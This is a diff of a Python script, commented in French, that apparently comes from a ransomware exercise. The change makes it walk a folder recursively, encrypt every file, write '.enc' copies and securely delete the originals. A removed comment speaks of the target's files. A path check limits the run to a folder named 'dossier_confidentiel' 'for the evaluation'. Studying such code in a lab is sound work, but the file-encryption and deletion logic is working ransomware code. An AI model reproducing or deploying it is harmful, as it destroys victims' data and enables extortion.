@@ -32,16 +32,27 @@ if __name__ == '__main__':
     except Exception as e:
         generate_key()
         key = load_key(keyfile_path)
-        
-    # Ici on devra mettre le path exact des fichiers qu'on cherche à chiffrer chez la cible
-    files_to_encrypt = ["dossier_confidentiel/Contrat_de_Prestation.docx", "dossier_confidentiel/Achats_Fournitures.xlsx"]
 
+    folder_path = "./encrypt_files/dossier_confidentiel"
     encrypted_files = {}
-    for file_path in files_to_encrypt:
-        ciphertext = encrypt_file(file_path, key)
-        encrypted_file_path = file_path + ".enc"
-        with open(encrypted_file_path, 'wb') as f:
-            f.write(ciphertext)
-        encrypted_files[file_path] = encrypted_file_path
-        secure_delete(file_path)
-
+    if not folder_path.endswith("dossier_confidentiel"):
+        folder_path = None
+        print("Le chemin ne se termine pas par 'dossier_confidentiel'. folder_path est défini sur None pour éviter une grosse bétise dans le cadre de l'évaluation.")
+    else :
+        if not os.path.exists(folder_path):
+            print("Le chemin spécifié n'existe pas.")
+        elif not os.path.isdir(folder_path):
+            print("Le chemin spécifié n'est pas un dossier.")
+        else:
+            print("Dossier valide, démarrage de l'exploration...")
+            for current_folder, child_folders, files in os.walk(folder_path):
+                print(f"Exploration du dossier : {current_folder}")
+                for file in files:
+                    file_path = os.path.join(current_folder, file)
+                    print(f"Fichier trouvé : {file_path}")
+                    ciphertext = encrypt_file(file_path, key)
+                    encrypted_file_path = file_path + ".enc"
+                    with open(encrypted_file_path, 'wb') as f:
+                        f.write(ciphertext)
+                    encrypted_files[file_path] = encrypted_file_path
+                    secure_delete(file_path)
